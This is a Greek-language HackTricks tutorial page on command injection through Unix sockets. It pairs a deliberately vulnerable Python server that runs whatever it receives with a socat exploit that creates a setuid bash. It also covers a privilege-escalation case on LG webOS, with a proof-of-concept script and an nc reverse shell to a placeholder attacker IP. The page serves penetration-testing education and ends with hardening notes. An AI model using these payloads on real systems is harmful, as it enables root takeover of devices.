# Socket Command Injection

{{#include ../../banners/hacktricks-training.md}}

## Παράδειγμα σύνδεσης Socket με Python

Στο ακόλουθο παράδειγμα δημιουργείται ένας **unix socket** (`/tmp/socket_test.s`) και οτιδήποτε **λαμβάνεται** θα **εκτελεστεί** από την `os.system`. Ξέρω ότι δεν θα βρείτε κάτι τέτοιο στο wild, αλλά ο σκοπός αυτού του παραδείγματος είναι να δείξει πώς μοιάζει ένας κώδικας που χρησιμοποιεί unix sockets και πώς να χειριστείτε την είσοδο στη χειρότερη δυνατή περίπτωση.
```python:s.py
import socket
import os, os.path
import time
from collections import deque

if os.path.exists("/tmp/socket_test.s"):
os.remove("/tmp/socket_test.s")

server = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
server.bind("/tmp/socket_test.s")
os.system("chmod o+w /tmp/socket_test.s")
while True:
server.listen(1)
conn, addr = server.accept()
datagram = conn.recv(1024)
if datagram:
print(datagram)
os.system(datagram)
conn.close()
```
**Εκτελέστε** τον κώδικα χρησιμοποιώντας python: `python s.py` και **ελέγξτε πώς ακούει το socket**:
```python
netstat -a -p --unix | grep "socket_test"
(Not all processes could be identified, non-owned process info
will not be shown, you would have to be root to see it all.)
unix  2      [ ACC ]     STREAM     LISTENING     901181   132748/python        /tmp/socket_test.s
```
**Exploit**
```python
echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash; chmod +x /tmp/bash;" | socat - UNIX-CLIENT:/tmp/socket_test.s
```
## Μελέτη περίπτωσης: Root-owned UNIX socket signal-triggered escalation (LG webOS)

Μερικά privileged daemons εκθέτουν ένα root-owned UNIX socket που δέχεται untrusted input και συζεύγνυει privileged actions με thread-IDs και signals. Αν το protocol επιτρέπει σε έναν unprivileged client να επηρεάσει ποιο native thread στοχεύεται, μπορεί να καταφέρετε να ενεργοποιήσετε ένα privileged code path και να escalate.

Observed pattern:
- Συνδεθείτε σε ένα root-owned socket (π.χ., /tmp/remotelogger).
- Δημιουργήστε ένα thread και αποκτήστε το native thread id (TID).
- Στείλτε το TID (packed) μαζί με padding ως request; λάβετε ένα acknowledgement.
- Στείλτε ένα συγκεκριμένο signal σε εκείνο το TID για να ενεργοποιήσετε το privileged behaviour.

Minimal PoC sketch:
```python
import socket, struct, os, threading, time
# Spawn a thread so we have a TID we can signal
th = threading.Thread(target=time.sleep, args=(600,)); th.start()
tid = th.native_id  # Python >=3.8
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect("/tmp/remotelogger")
s.sendall(struct.pack('<L', tid) + b'A'*0x80)
s.recv(4)  # sync
os.kill(tid, 4)  # deliver SIGILL (example from the case)
```
Για να το μετατρέψετε σε root shell, μπορεί να χρησιμοποιηθεί ένα απλό named-pipe + nc μοτίβο:
```bash
rm -f /tmp/f; mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | nc <ATTACKER-IP> 23231 > /tmp/f
```
Σημειώσεις:
- Αυτή η κατηγορία σφαλμάτων προκύπτει από την εμπιστοσύνη σε τιμές που προέρχονται από μη προνομιακή κατάσταση του client (TIDs) και τη σύνδεσή τους με προνομιακούς χειριστές σημάτων ή λογική.
- Ενισχύστε την ασφάλεια εφαρμόζοντας διαπιστευτήρια στο socket, επικυρώνοντας τις μορφές μηνυμάτων και αποσυνδέοντας προνομιακές λειτουργίες από εξωτερικά παρεχόμενα αναγνωριστικά νημάτων.

## Αναφορές

- [LG WebOS TV Path Traversal, Authentication Bypass and Full Device Takeover (SSD Disclosure)](https://ssd-disclosure.com/lg-webos-tv-path-traversal-authentication-bypass-and-full-device-takeover/)

{{#include ../../banners/hacktricks-training.md}}
